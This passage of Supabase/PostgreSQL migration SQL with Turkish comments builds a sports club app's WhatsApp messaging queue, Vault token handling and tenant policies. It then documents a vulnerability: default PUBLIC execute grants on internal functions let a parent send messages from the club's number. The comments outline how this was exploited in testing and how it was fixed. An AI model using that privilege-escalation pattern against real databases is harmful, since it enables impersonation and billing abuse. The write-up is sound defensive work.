-- restrictive politika yalnızca adlandırdığı rollere uygulanır ve `anon`
-- rolünde duvar hiç devreye girmezdi.
drop policy if exists "kulup izolasyonu" on public.wa_hesap;
create policy "kulup izolasyonu" on public.wa_hesap        as restrictive for all using (kulup_id = private.current_kulup_id()) with check (kulup_id = private.current_kulup_id());
drop policy if exists "kulup izolasyonu" on public.wa_sablon;
create policy "kulup izolasyonu" on public.wa_sablon       as restrictive for all using (kulup_id = private.current_kulup_id()) with check (kulup_id = private.current_kulup_id());
drop policy if exists "kulup izolasyonu" on public.wa_onay;
create policy "kulup izolasyonu" on public.wa_onay         as restrictive for all using (kulup_id = private.current_kulup_id()) with check (kulup_id = private.current_kulup_id());
drop policy if exists "kulup izolasyonu" on public.wa_giden;
create policy "kulup izolasyonu" on public.wa_giden        as restrictive for all using (kulup_id = private.current_kulup_id()) with check (kulup_id = private.current_kulup_id());
drop policy if exists "kulup izolasyonu" on public.wa_gunluk_sayac;
create policy "kulup izolasyonu" on public.wa_gunluk_sayac as restrictive for all using (kulup_id = private.current_kulup_id()) with check (kulup_id = private.current_kulup_id());

-- Rol politikaları: yalnızca yönetici. Veli ve antrenörün WhatsApp yapılandırması
-- ya da giden kutusuyla hiçbir işi yok.
drop policy if exists "wa_hesap: yönetici okur" on public.wa_hesap;
create policy "wa_hesap: yönetici okur"    on public.wa_hesap  for select using (private.current_profile_role() = 'yonetici');
drop policy if exists "wa_sablon: yönetici okur" on public.wa_sablon;
create policy "wa_sablon: yönetici okur"   on public.wa_sablon for select using (private.current_profile_role() = 'yonetici');
drop policy if exists "wa_giden: yönetici okur" on public.wa_giden;
create policy "wa_giden: yönetici okur"    on public.wa_giden  for select using (private.current_profile_role() = 'yonetici');
drop policy if exists "wa_onay: yönetici yönetir" on public.wa_onay;
create policy "wa_onay: yönetici yönetir"  on public.wa_onay   for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

-- ⚠ wa_hesap'a YAZMA POLİTİKASI YOK. Bağlantı kurulumu (waba_id,
--   telefon_numarasi_id ve Vault'a jeton yazma) yalnızca sunucu tarafından,
--   aşağıdaki SECURITY DEFINER fonksiyonla yapılıyor. Yönetici tabloyu doğrudan
--   düzenleyebilseydi başka bir kulübün numarasını kendi kaydına yazabilir ya da
--   aktif bayrağını zorlayabilirdi.

-- wa_olay kiracıya bağlı değil (webhook wamid ile geliyor, kulüp bilinmiyor);
-- bu yüzden istemciye TAMAMEN kapalı. Yalnızca SECURITY DEFINER fonksiyon yazar.
drop policy if exists "wa_olay: istemciye kapalı" on public.wa_olay;
create policy "wa_olay: istemciye kapalı" on public.wa_olay as restrictive for all using (false) with check (false);


-- ===========================================================================
-- 10) BAĞLANTI KURULUMU — jetonu Vault'a yazan TEK yol
-- ===========================================================================
-- Yönetici jetonu panele girer; jeton buradan Vault'a gider ve BİR DAHA
-- OKUNAMAZ. Fonksiyon jetonu ne döndürür ne loglar.
--
-- SECURITY DEFINER + sahibi postgres: çağıran yöneticinin Vault'a erişimi yok,
-- fonksiyonun var. `wa_hesap`'a yazma politikası da bilinçli olarak yok — tek
-- yazma yolu burası, böylece kulüp kendi kaydının `aktif` bayrağını ya da
-- başka bir kulübün numarasını zorlayamıyor.
create or replace function public.wa_baglanti_kur(
  p_waba_id             text,
  p_telefon_numarasi_id text,
  p_gorunen_numara      text,
  p_jeton               text
) returns void
language plpgsql
security definer
set search_path = ''
as $$
declare
  v_kulup  uuid := private.current_kulup_id();
  v_secret uuid;
  v_eski   uuid;
begin
  if private.current_profile_role() <> 'yonetici' then
    raise exception 'WhatsApp bağlantısını yalnızca kulüp yöneticisi kurabilir.'
      using errcode = 'insufficient_privilege';
  end if;
  if v_kulup is null then
    raise exception 'Kulüp bulunamadı.';
  end if;
  if coalesce(btrim(p_jeton), '') = '' then
    raise exception 'Erişim jetonu boş olamaz.';
  end if;

  -- Jeton her kulüp için ayrı bir Vault sırrı. Ad kulüp kimliğini taşıyor ki
  -- Vault içinde hangi sırrın kime ait olduğu belli olsun.
  select secret_id into v_eski from private.wa_gizli where kulup_id = v_kulup;

  if v_eski is not null then
    perform vault.update_secret(v_eski, p_jeton);
    v_secret := v_eski;
  else
    v_secret := vault.create_secret(p_jeton, 'wa_jeton_' || v_kulup::text,
                                    'WhatsApp Cloud API erişim jetonu');
    insert into private.wa_gizli (kulup_id, secret_id) values (v_kulup, v_secret);
  end if;

  insert into public.wa_hesap (kulup_id, waba_id, telefon_numarasi_id, gorunen_numara, aktif, devre_disi_sebep)
  values (v_kulup, p_waba_id, p_telefon_numarasi_id,
          coalesce(private.telefon_e164(p_gorunen_numara), p_gorunen_numara), true, null)
  on conflict (kulup_id) do update
    set waba_id             = excluded.waba_id,
        telefon_numarasi_id = excluded.telefon_numarasi_id,
        gorunen_numara      = excluded.gorunen_numara,
        aktif               = true,
        devre_disi_sebep    = null;
end;
$$;

revoke execute on function public.wa_baglanti_kur(text, text, text, text) from public, anon;
grant  execute on function public.wa_baglanti_kur(text, text, text, text) to authenticated;


-- ===========================================================================
-- 11) KUYRUĞA ALMA — tekilleştirme, onay ve limit burada
-- ===========================================================================
-- `p_alicilar`: [{"telefon":"...", "sporcu_id":"...", "parametreler":[...]}, ...]
-- HTTP çağırmaz; yalnızca satır yazar. Böylece çağıran (mobil uygulama ya da
-- panel) hızlı döner ve gönderim cron'a kalır.
create or replace function private.wa_kuyruga_al(
  p_kulup_id     uuid,
  p_tur          text,
  p_sablon_ad    text,
  p_alicilar     jsonb,
  p_kaynak_tablo text default null,
  p_kaynak_id    uuid default null
) returns int
language plpgsql
security definer
set search_path = ''
as $$
declare
  v_eklenen int := 0;
  v_aktif   boolean;
begin
  select aktif into v_aktif from public.wa_hesap where kulup_id = p_kulup_id;
  if coalesce(v_aktif, false) = false then
    return 0;   -- bağlantı yok ya da askıda: sessizce atlanır, çağıran akış bozulmaz
  end if;

  with ham as (
    select private.telefon_e164(a->>'telefon')            as tel,
           nullif(a->>'sporcu_id', '')::uuid              as sporcu_id,
           coalesce(a->'parametreler', '[]'::jsonb)       as parametreler
      from jsonb_array_elements(p_alicilar) a
  ),
  -- TEKİLLEŞTİRME: aynı numaraya bir kez. Ölçüldü — 22 sporcu, 13 tekil veli.
  -- distinct on ile ilk satır seçiliyor; parametreler o satırdan geliyor.
  tekil as (
    select distinct on (tel) tel, sporcu_id, parametreler
      from ham
     where tel is not null
     order by tel, sporcu_id
  ),
  -- ONAY SÜZGECİ: kaydı olmayan numara varsayılan olarak GÖNDERİLEBİLİR sayılır
  -- (kulüp velisiyle zaten sözleşmeli); açıkça 'reddedildi' ya da 'whatsapp_yok'
  -- işaretliyse atlanır.
  izinli as (
    select t.* from tekil t
      left join public.wa_onay o
        on o.kulup_id = p_kulup_id and o.telefon = t.tel
     where coalesce(o.durum, 'onayli') = 'onayli'
  )
  insert into public.wa_giden (kulup_id, tur, sablon_ad, parametreler,
                               alici_telefon, alici_sporcu_id, kaynak_tablo, kaynak_id)
  select p_kulup_id, p_tur, p_sablon_ad, i.parametreler, i.tel, i.sporcu_id,
         p_kaynak_tablo, p_kaynak_id
    from izinli i;

  get diagnostics v_eklenen = row_count;
  return v_eklenen;
end;
$$;


-- ===========================================================================
-- 12) GÖNDERİM — jetonun Vault'tan çıkıp Meta'ya gittiği tek yer
-- ===========================================================================
-- `for update ... skip locked`: aynı anda iki cron çalışması aynı satırı iki kez
-- göndermesin. Bu olmadan bir yavaşlama anında mesajlar ÇİFT giderdi — hem
-- ücretlendirilir hem veliyi rahatsız eder.
create or replace function private.wa_gonder(p_azami int default 200)
returns int
language plpgsql
security definer
set search_path = ''
as $$
declare
  r          record;
  v_jeton    text;
  v_govde    jsonb;
  v_istek    bigint;
  v_gonderim int := 0;
begin
  for r in
    select g.id, g.kulup_id, g.sablon_ad, g.parametreler, g.alici_telefon,
           h.telefon_numarasi_id, s.secret_id, t.dil
      from public.wa_giden g
      join public.wa_hesap  h on h.kulup_id = g.kulup_id and h.aktif
      join private.wa_gizli s on s.kulup_id = g.kulup_id
      left join public.wa_sablon t on t.kulup_id = g.kulup_id and t.ad = g.sablon_ad
     where g.durum = 'bekliyor'
       and coalesce(g.sonraki_deneme, g.created_at) <= now()
       -- Meta'nın duraklattığı şablonun kuyruğu donar, diğerleri akmaya devam eder.
       and coalesce(t.duraklatma_bitis, '-infinity'::timestamptz) < now()
     order by g.created_at
     limit p_azami
     for update of g skip locked
  loop
    -- Jeton BU DÖNGÜNÜN İÇİNDE, tek satırlık ömürle okunuyor: hiçbir yere
    -- yazılmıyor, döndürülmüyor, hata mesajına konmuyor.
    select decrypted_secret into v_jeton
      from vault.decrypted_secrets where id = r.secret_id;

    if v_jeton is null then
      update public.wa_giden
         set durum = 'basarisiz', hata_metni = 'Vault sırrı bulunamadı', deneme = deneme + 1
       where id = r.id;
      continue;
    end if;

    v_govde := jsonb_build_object(
      'messaging_product', 'whatsapp',
      'to',   r.alici_telefon,
      'type', 'template',
      'template', jsonb_build_object(
        'name', r.sablon_ad,
        'language', jsonb_build_object('code', coalesce(r.dil, 'tr')),
        'components', case
          when jsonb_array_length(r.parametreler) = 0 then '[]'::jsonb
          else jsonb_build_array(jsonb_build_object(
                 'type', 'body',
                 'parameters', (select jsonb_agg(jsonb_build_object('type', 'text', 'text', p))
                                  from jsonb_array_elements_text(r.parametreler) p)))
        end
      )
    );

    v_istek := net.http_post(
      url     := 'https://graph.facebook.com/v23.0/' || r.telefon_numarasi_id || '/messages',
      body    := v_govde,
      headers := jsonb_build_object('Content-Type', 'application/json',
                                    'Authorization', 'Bearer ' || v_jeton),
      timeout_milliseconds := 15000
    );

    update public.wa_giden
       set durum = 'gonderildi', istek_id = v_istek,
           gonderim_zamani = now(), deneme = deneme + 1
     where id = r.id;

    -- Günlük BENZERSİZ ALICI sayacı (Meta limiti mesaj değil alıcı sayıyor).
    insert into public.wa_gunluk_sayac (kulup_id, gun, telefon)
    values (r.kulup_id, current_date, r.alici_telefon)
    on conflict do nothing;

    v_gonderim := v_gonderim + 1;
  end loop;

  return v_gonderim;
end;
$$;


-- ===========================================================================
-- 13) YANIT EŞLEŞTİRME — "gönderdim" ile "kabul edildi" farkı
-- ===========================================================================
-- pg_net asenkron olduğu için yanıt sonra düşüyor. Burada eşleştirilip hata
-- SINIFLANDIRILIYOR. Ayrım olmadan iki kötü sonuçtan biri kaçınılmaz olurdu:
-- ya kalıcı hatalar sonsuza kadar tekrar denenir (kota ve kalite yanar), ya da
-- geçici bir ağ hatasında mesaj sessizce kaybolur.
create or replace function private.wa_yanit_isle()
returns int
language plpgsql
security definer
set search_path = ''
as $$
declare
  r       record;
  v_kod   int;
  v_islem int := 0;
begin
  for r in
    select g.id, g.kulup_id, g.deneme, g.alici_telefon,
           y.status_code, y.content, y.error_msg, y.timed_out
      from public.wa_giden g
      join net._http_response y on y.id = g.istek_id
     where g.durum = 'gonderildi'
     limit 500
  loop
    v_islem := v_islem + 1;

    -- Ağ katmanı hatası: her zaman GEÇİCİ sayılır.
    if r.timed_out or r.error_msg is not null then
      update public.wa_giden
         set durum = case when r.deneme >= 3 then 'basarisiz' else 'bekliyor' end,
             sonraki_deneme = now() + (interval '2 minutes' * r.deneme),
             hata_metni = coalesce(r.error_msg, 'zaman aşımı')
       where id = r.id;
      continue;
    end if;

    if r.status_code between 200 and 299 then
      update public.wa_giden
         set durum = 'kabul_edildi',
             wamid = r.content::jsonb #>> '{messages,0,id}',
             hata_kodu = null, hata_metni = null
       where id = r.id;
      continue;
    end if;

    v_kod := nullif(r.content::jsonb #>> '{error,code}', '')::int;

    -- JETON GEÇERSİZ (190/200): tekrar denemek anlamsız. O KULÜBÜN bağlantısı
    -- kapatılıyor; diğer kulüpler etkilenmiyor (tek numara modelinde hepsi dururdu).
    if v_kod in (190, 200) then
      update public.wa_hesap
         set aktif = false,
             devre_disi_sebep = 'Erişim jetonu geçersiz (Meta hata ' || v_kod || '). Panelden yeniden bağlanın.'
       where kulup_id = r.kulup_id;
      update public.wa_giden
         set durum = 'basarisiz', hata_kodu = v_kod, hata_metni = 'Erişim jetonu geçersiz'
       where id = r.id;
      continue;
    end if;

    -- NUMARA WHATSAPP KULLANMIYOR (131026): kalıcı. Onay kaydına işleniyor ki
    -- bu numara bir daha hiç denenmesin — her deneme kalite derecesini boşuna düşürür.
    if v_kod = 131026 then
      insert into public.wa_onay (kulup_id, telefon, durum, kaynak)
      values (r.kulup_id, r.alici_telefon, 'whatsapp_yok', 'Meta 131026')
      on conflict (kulup_id, telefon) do update set durum = 'whatsapp_yok', guncelleme = now();

      update public.wa_giden
         set durum = 'basarisiz', hata_kodu = v_kod, hata_metni = 'Numara WhatsApp kullanmıyor'
       where id = r.id;
      continue;
    end if;

    -- ORAN SINIRI ve geçici sunucu hataları: üstel geri çekilerek tekrar dene.
    if v_kod in (4, 80007, 130429, 131000, 131016, 131056, 131057) or r.status_code >= 500 then
      update public.wa_giden
         set durum = case when r.deneme >= 5 then 'basarisiz' else 'bekliyor' end,
             sonraki_deneme = now() + (interval '5 minutes' * r.deneme),
             hata_kodu = v_kod, hata_metni = left(r.content, 300)
       where id = r.id;
      continue;
    end if;

    -- Geri kalan her şey KALICI sayılıyor (şablon yok/onaysız, biçim hatası…).
    update public.wa_giden
       set durum = 'basarisiz', hata_kodu = v_kod, hata_metni = left(r.content, 300)
     where id = r.id;
  end loop;

  return v_islem;
end;
$$;


-- ===========================================================================
-- 14) YETİM TOPLAMA — yanıtı hiç düşmeyen istekler
-- ===========================================================================
-- `net._http_response` 6 saat sonra temizleniyor. Bir yanıt kaçırılırsa satır
-- sonsuza kadar 'gonderildi'de asılı kalır ve kimse fark etmez — bu projenin
-- tekrar tekrar karşılaştığı SESSİZ KAYIP sınıfı.
create or replace function private.wa_yetim_topla(p_yas interval default '15 minutes')
returns int
language plpgsql
security definer
set search_path = ''
as $$
declare v_sayi int;
begin
  update public.wa_giden g
     set durum = case when g.deneme >= 3 then 'basarisiz' else 'bekliyor' end,
         sonraki_deneme = now() + interval '2 minutes',
         hata_metni = 'Yanıt alınamadı (yetim istek)'
   where g.durum = 'gonderildi'
     and g.gonderim_zamani < now() - p_yas
     and not exists (select 1 from net._http_response y where y.id = g.istek_id);
  get diagnostics v_sayi = row_count;
  return v_sayi;
end;
$$;


-- ===========================================================================
-- 15) ZAMANLANMIŞ İŞLER
-- ===========================================================================
-- Kuyruk dakikada bir boşaltılıyor. Daha sık gerekmiyor: duyuru anlık bir
-- işlem değil ve pg_net zaten asenkron.
-- Cron kurulumu da sarmalanıyor: pg_cron yoksa `cron` şeması hiç olmaz ve
-- sarmalanmamış bir çağrı kurulum paketini bu noktada durdururdu.
do $cronis$
begin
  if not exists (select 1 from pg_namespace where nspname = 'cron') then
    raise warning 'pg_cron yok — WhatsApp kuyruğu otomatik boşaltılmayacak. private.wa_gonder() ve private.wa_yanit_isle() dışarıdan (ör. Edge Function + zamanlayıcı) çağrılmalı.';
    return;
  end if;

  perform cron.unschedule(jobname)
    from cron.job where jobname in ('wa_gonder', 'wa_yanit_isle', 'wa_yetim_topla');

  perform cron.schedule('wa_gonder',      '* * * * *',   'select private.wa_gonder(200)');
  perform cron.schedule('wa_yanit_isle',  '* * * * *',   'select private.wa_yanit_isle()');
  perform cron.schedule('wa_yetim_topla', '*/5 * * * *', 'select private.wa_yetim_topla()');
end $cronis$;


-- ===========================================================================
-- DOĞRULAMA
-- ===========================================================================
do $$
begin
  if has_table_privilege('authenticated', 'private.wa_gizli', 'SELECT') then
    raise exception '0043: authenticated jeton tablosunu okuyabiliyor.';
  end if;
  if has_schema_privilege('authenticated', 'vault', 'USAGE') then
    raise exception '0043: authenticated Vault şemasına erişebiliyor.';
  end if;
  -- Cron kontrolü yalnızca pg_cron varsa anlamlı.
  -- ⚠ İÇ İÇE IF ŞART: tek satırda `if A and (select ... from cron.job)` yazılırsa PL/pgSQL
  -- ifadenin TAMAMINI tek SQL olarak planlar ve cron şeması yokken "relation
  -- cron.job does not exist" ile patlar — A false olsa bile. İç içe if'te
  -- iç ifade ancak oraya ulaşılınca planlanıyor.
  if exists (select 1 from pg_namespace where nspname = 'cron') then
    if (select count(*) from cron.job where jobname in ('wa_gonder','wa_yanit_isle','wa_yetim_topla')) <> 3 then
      raise exception '0043: cron işleri eksik.';
    end if;
  end if;
  raise notice '0043 tamam: şema, gönderim motoru ve cron kuruldu. Jeton istemciye kapalı.';
end $$;


-- ===========================================================================
-- 0044 — KRİTİK: WhatsApp motorunun iç fonksiyonları herkese açıktı
-- ===========================================================================
-- NASIL OLDU
--   PostgreSQL `create function` ile oluşturulan her fonksiyona EXECUTE iznini
--   VARSAYILAN OLARAK PUBLIC'e verir. 0043'te dört iç fonksiyon yazıldı ve
--   hiçbirinden bu varsayılan geri alınmadı. `authenticated` rolünün `private`
--   şeması üzerinde USAGE yetkisi var (kiracı duvarı `private.current_kulup_id()`
--   çağırdığı için OLMAK ZORUNDA), dolayısıyla fonksiyonlar doğrudan
--   çağrılabilir hâle geldi.
--
--   0043'te `public.wa_baglanti_kur` için revoke YAZILDI ama `private`
--   şemasındaki dördü unutuldu. Aynı dosyada bir yerde doğru yapılıp başka
--   yerde atlanması, bu hatanın neden kolayca gözden kaçtığını da açıklıyor.
--
-- NASIL YAKALANDI
--   Periyodik güvenlik denetimi turu. Önce izinler ölçüldü:
--     select proname, has_function_privilege('authenticated', oid, 'EXECUTE')
--       from pg_proc ... where nspname='private' and proname like 'wa\_%';
--       → wa_gonder | t,  wa_kuyruga_al | t,  wa_yanit_isle | t,  wa_yetim_topla | t
--   Sonra SÖMÜRÜLDÜ (veli JWT'si, transaction + rollback):
--     1. VELİ  private.wa_kuyruga_al(<kulup_id>, 'duyuru', ...)  → 1 satır eklendi
--     2. VELİ  private.wa_gonder(10)                              → 1 mesaj gönderildi
--     3. VELİ  private.wa_yetim_topla('0 seconds')                → çağırdı
--   Karşı-test: `wa_baglanti_kur` reddetti (rol kontrolü tutuyor), `anon`
--   reddedildi (private şemasında USAGE yok). Yani açık tam olarak dört
--   fonksiyonda.
--
-- ETKİSİ — KRİTİK
--   Bir VELİ, kulübün DOĞRULANMIŞ WhatsApp Business numarasından, istediği
--   telefon numarasına, istediği şablon parametreleriyle mesaj gönderebiliyordu.
--   Sonuçları:
--     · Kimliğe bürünme: mesaj kulübün adıyla gidiyor.
--     · Para: her mesaj kulübün faturasına yazılıyor.
--     · KALICI HASAR: Meta kalite derecesini numara bazında tutuyor. Spam
--       gönderimi dereceyi düşürür, düşen derece günlük mesaj limitini kısar ve
--       en kötü hâlde numara tamamen bloke olur. Yani veli, kulübün veli
--       iletişim kanalını kalıcı olarak yakabilirdi.
--   `wa_kuyruga_al` kulüp kimliğini PARAMETRE olarak aldığı için hedef kendi
--   kulübüyle de sınırlı değildi — başka bir kulübün id'si bilinirse o kulübün
--   numarasından da gönderilebilirdi.
--
-- NEDEN BU ÇÖZÜM
--   İki katman:
--
--   (1) EXECUTE İZNİNİ GERİ AL. Bu fonksiyonlar İÇ fonksiyonlar; yalnızca cron
--       (postgres olarak) ve aşağıdaki public sarmalayıcı çağırmalı. Şema
--       düzeyindeki USAGE geri alınamaz — kiracı duvarı `private`'a bağlı —
--       o yüzden fonksiyon düzeyinde alınıyor. `private.davet_coz` zaten böyle
--       yapılmış; bu, o dosyada kurulan doğru deseni geri kalanına uygulamak.
--
--   (2) FONKSİYONUN KENDİSİ DE KULÜBÜ DOĞRULASIN. İzin geri alınsa bile,
--       ileride biri yanlışlıkla yeniden grant verirse ya da başka bir definer
--       fonksiyon bunu çağırırsa savunma sürsün. `wa_kuyruga_al` artık çağıranın
--       oturumunda bir kulüp varsa onunla parametrenin EŞLEŞMESİNİ şart koşuyor.
--       Oturumda kulüp yoksa (cron/postgres bağlamı, auth.uid() NULL) kontrol
--       atlanıyor — arka plan işi çalışmaya devam etsin diye.
--
--   (3) UYGULAMANIN ÇAĞIRACAĞI YOL: `public.wa_duyuru_kuyruga_al`.
--       Kulüp kimliğini PARAMETRE OLARAK ALMIYOR — oturumdan türetiyor. Bir
--       fonksiyonun kiracı kimliğini dışarıdan alması, bu şemadaki en tehlikeli
--       desen; sarmalayıcı o parametreyi tamamen ortadan kaldırıyor.
--
-- ÇALIŞTIRMA: 0043'ten sonra. Tekrar çalıştırılabilir.
-- ===========================================================================


-- ===========================================================================
-- 1) İÇ FONKSİYONLARIN EXECUTE İZNİ GERİ ALINIYOR
-- ===========================================================================
revoke all on function private.wa_kuyruga_al(uuid, text, text, jsonb, text, uuid) from public, anon, authenticated;
revoke all on function private.wa_gonder(int)                                     from public, anon, authenticated;
revoke all on function private.wa_yanit_isle()                                    from public, anon, authenticated;
revoke all on function private.wa_yetim_topla(interval)                           from public, anon, authenticated;

-- service_role sunucu tarafı bir bakım yolu için çağırabilsin (RLS'i zaten
-- baypas eden platform rolü; buradan bir yetki KAZANMIYOR).
grant execute on function private.wa_gonder(int)      to service_role;
grant execute on function private.wa_yanit_isle()     to service_role;
grant execute on function private.wa_yetim_topla(interval) to service_role;


-- ===========================================================================
-- 2) DERİNLEMESİNE SAVUNMA — fonksiyon kendi kiracı sınırını da koysun
-- ===========================================================================
-- Gövde 0043'teki ile aynı; başına kulüp doğrulaması eklendi.
create or replace function private.wa_kuyruga_al(
  p_kulup_id     uuid,
  p_tur          text,
  p_sablon_ad    text,
  p_alicilar     jsonb,
  p_kaynak_tablo text default null,
  p_kaynak_id    uuid default null
) returns int
language plpgsql
security definer
set search_path = ''
as $$
declare
  v_eklenen int := 0;
  v_aktif   boolean;
  v_oturum  uuid;
begin
  -- 0044: KİRACI DOĞRULAMASI.
  -- Oturumda bir kulüp varsa (gerçek kullanıcı), parametreyle eşleşmek ZORUNDA.
  -- Oturumda kulüp yoksa (cron / postgres bağlamı, auth.uid() NULL) kontrol
  -- atlanır — arka plan işleri çalışmaya devam etsin.
  v_oturum := private.current_kulup_id();
  if v_oturum is not null and v_oturum <> p_kulup_id then
    raise exception 'Başka bir kulübün WhatsApp kuyruğuna yazılamaz.'
      using errcode = 'insufficient_privilege';
  end if;

  select aktif into v_aktif from public.wa_hesap where kulup_id = p_kulup_id;
  if coalesce(v_aktif, false) = false then
    return 0;   -- bağlantı yok ya da askıda: sessizce atlanır, çağıran akış bozulmaz
  end if;

  with ham as (
    select private.telefon_e164(a->>'telefon')      as tel,
           nullif(a->>'sporcu_id', '')::uuid        as sporcu_id,
           coalesce(a->'parametreler', '[]'::jsonb) as parametreler
      from jsonb_array_elements(p_alicilar) a
  ),
  -- TEKİLLEŞTİRME: aynı numaraya bir kez (ölçüldü: 22 sporcu → 13 tekil veli).
  tekil as (
    select distinct on (tel) tel, sporcu_id, parametreler
      from ham where tel is not null order by tel, sporcu_id
  ),
  -- ONAY SÜZGECİ: kaydı olmayan numara gönderilebilir sayılır; açıkça
  -- 'reddedildi' ya da 'whatsapp_yok' işaretliyse atlanır.
  izinli as (
    select t.* from tekil t
      left join public.wa_onay o on o.kulup_id = p_kulup_id and o.telefon = t.tel
     where coalesce(o.durum, 'onayli') = 'onayli'
  )
  insert into public.wa_giden (kulup_id, tur, sablon_ad, parametreler,
                               alici_telefon, alici_sporcu_id, kaynak_tablo, kaynak_id)
  select p_kulup_id, p_tur, p_sablon_ad, i.parametreler, i.tel, i.sporcu_id,
         p_kaynak_tablo, p_kaynak_id
    from izinli i;

  get diagnostics v_eklenen = row_count;
  return v_eklenen;
end;
$$;

revoke all on function private.wa_kuyruga_al(uuid, text, text, jsonb, text, uuid) from public, anon, authenticated;


-- ===========================================================================
-- 3) UYGULAMANIN ÇAĞIRACAĞI GÜVENLİ YOL
-- ===========================================================================
-- Kulüp kimliğini PARAMETRE ALMIYOR — oturumdan türetiyor. Sömürülen açığın
-- kökü tam olarak "kiracı kimliğini dışarıdan almak"tı; sarmalayıcı o
-- parametreyi ortadan kaldırıyor.
create or replace function public.wa_duyuru_kuyruga_al(
  p_tur       text,
  p_sablon_ad text,
  p_alicilar  jsonb,
  p_kaynak_id uuid default null
) returns int
language plpgsql
security definer
set search_path = ''
as $$
declare v_kulup uuid;
begin
  if private.current_profile_role() <> 'yonetici' then
    raise exception 'WhatsApp mesajı yalnızca kulüp yöneticisi gönderebilir.'
      using errcode = 'insufficient_privilege';
  end if;

  v_kulup := private.current_kulup_id();
  if v_kulup is null then
    raise exception 'Kulüp bulunamadı.';
  end if;

  -- Kötüye kullanım freni: toplu gönderim ucu, hız sınırının en çok gerektiği
  -- yerlerden biri (0032). Yönetici hesabı ele geçirilirse tek istekte binlerce
  -- mesaj kuyruğa girmesin.
  perform private.hiz_kontrol('wa_gonderim', 20, interval '1 hour',
    'Çok fazla WhatsApp gönderimi denendi. Bir saat içinde en fazla 20 gönderim yapılabilir.');

  return private.wa_kuyruga_al(v_kulup, p_tur, p_sablon_ad, p_alicilar, 'duyuru', p_kaynak_id);
end;
$$;

revoke all     on function public.wa_duyuru_kuyruga_al(text, text, jsonb, uuid) from public, anon;
grant  execute on function public.wa_duyuru_kuyruga_al(text, text, jsonb, uuid) to authenticated;


-- ===========================================================================
-- DOĞRULAMA
-- ===========================================================================
do $$
declare r record;
begin
  for r in
    select p.oid, p.proname
      from pg_proc p join pg_namespace n on n.oid = p.pronamespace
     where n.nspname = 'private' and p.proname like 'wa\_%'
  loop
    if has_function_privilege('authenticated', r.oid, 'EXECUTE') then
      raise exception '0044: private.%() hâlâ authenticated tarafından çağrılabiliyor.', r.proname;
    end if;
    if has_function_privilege('anon', r.oid, 'EXECUTE') then
      raise exception '0044: private.%() hâlâ anon tarafından çağrılabiliyor.', r.proname;
    end if;
  end loop;

  if not has_function_privilege('authenticated',
       'public.wa_duyuru_kuyruga_al(text,text,jsonb,uuid)', 'EXECUTE') then
    raise exception '0044: güvenli sarmalayıcı authenticated tarafından çağrılamıyor — fazla kısıldı.';
  end if;

  raise notice '0044 tamam: iç WhatsApp fonksiyonları kapatıldı, güvenli sarmalayıcı açık.';
end $$;


-- ===========================================================================
-- WHATSAPP GÖNDERİM TAVANI  (kaynak: 0045)
-- ===========================================================================
-- 0044'ün hız sınırı ÇAĞRI sayıyordu, MESAJ değil. Yerelde ölçüldü: yönetici
-- JWT'siyle tek çağrıda 5000 mesaj kuyruğa girdi (20 çağrı/saat ile 100.000/saat)
-- ve alıcıların hiçbiri kulübe ait değildi. Kırılan değişmez PARA ve İTİBAR
-- olduğu için tavan RLS'e değil TETİKLEYİCİYE konuyor: service_role de dahil
-- herkese işlesin. Ayrıntılı gerekçe: migrations/0045_whatsapp_gonderim_tavani.sql
-- ===========================================================================


-- ===========================================================================
-- 1) PARA DEĞİŞMEZİ — TETİKLEYİCİ (herkese işler, service_role dahil)
-- ===========================================================================
create or replace function private.wa_giden_tavan()
returns trigger
language plpgsql
security definer
set search_path = ''
as $$
declare
  r       record;
  v_tavan int;
  v_var   int;
begin
  for r in select kulup_id, count(*)::int as adet from yeni group by kulup_id loop
    -- Tavan sunucu tarafından belirlenir; istemci wa_hesap'a yazamaz.
    select greatest(coalesce(h.gunluk_limit, 0), 2000) into v_tavan
      from public.wa_hesap h where h.kulup_id = r.kulup_id;
    v_tavan := coalesce(v_tavan, 2000);

    -- AFTER tetikleyici: yeni satırlar bu sayıma ZATEN dahil.
    select count(*)::int into v_var
      from public.wa_giden g
     where g.kulup_id = r.kulup_id
       and g.created_at > now() - interval '24 hours';

    if v_var > v_tavan then
      raise exception
        'WhatsApp gönderim tavanı aşıldı: son 24 saatte % mesaj, tavan %. Toplu gönderimi bölün ya da limitin yükseltilmesi için destek ile görüşün.',
        v_var, v_tavan
        using errcode = 'check_violation';
    end if;
  end loop;
  return null;
end;
$$;

-- YENİ FONKSİYON = YENİ REVOKE. PostgreSQL her yeni fonksiyona EXECUTE'u
-- varsayılan olarak PUBLIC'e verir; 0044'ün doğrulama bloğu private.wa_* deseni
-- altındaki her fonksiyonu tarıyor ve bu satır olmadan 0044 bir daha
-- çalıştırılamaz hâle geliyor (ölçüldü: "0044: private.wa_giden_tavan() hâlâ
-- authenticated tarafından çağrılabiliyor"). Tetikleyici gövdesi doğrudan
-- çağrılınca zaten hata verir, ama kural kuraldır.
revoke all on function private.wa_giden_tavan() from public, anon, authenticated;

drop trigger if exists wa_giden_tavan on public.wa_giden;
create trigger wa_giden_tavan
  after insert on public.wa_giden
  referencing new table as yeni
  for each statement execute function private.wa_giden_tavan();


-- ===========================================================================
-- 2) SARMALAYICI — tek çağrıda alıcı sayısı sınırı
-- ===========================================================================
-- Tetikleyici zaten kapıyı tutuyor; buradaki sınır (a) 10 milyon elemanlı bir
-- jsonb'nin belleği şişirmesini iş YAPILMADAN önce durduruyor, (b) istemciye
-- anlaşılır bir hata veriyor. Gövde 0044'teki ile aynı; yalnızca bu kontroller
-- eklendi.
create or replace function public.wa_duyuru_kuyruga_al(
  p_tur       text,
  p_sablon_ad text,
  p_alicilar  jsonb,
  p_kaynak_id uuid default null
) returns int
language plpgsql
security definer
set search_path = ''
as $$
declare
  v_kulup uuid;
  v_adet  int;
begin
  if private.current_profile_role() <> 'yonetici' then
    raise exception 'WhatsApp mesajı yalnızca kulüp yöneticisi gönderebilir.'
      using errcode = 'insufficient_privilege';
  end if;

  v_kulup := private.current_kulup_id();
  if v_kulup is null then
    raise exception 'Kulüp bulunamadı.';
  end if;

  if p_alicilar is null or jsonb_typeof(p_alicilar) <> 'array' then
    raise exception 'Alıcı listesi bir dizi olmalı.'
      using errcode = 'invalid_parameter_value';
  end if;

  -- 0045: hız sınırı ÇAĞRI sayıyor, mesaj değil. Alıcı tavanı olmadan tek
  -- istekte 5000 mesaj kuyruğa girebiliyordu (ölçüldü).
  v_adet := jsonb_array_length(p_alicilar);
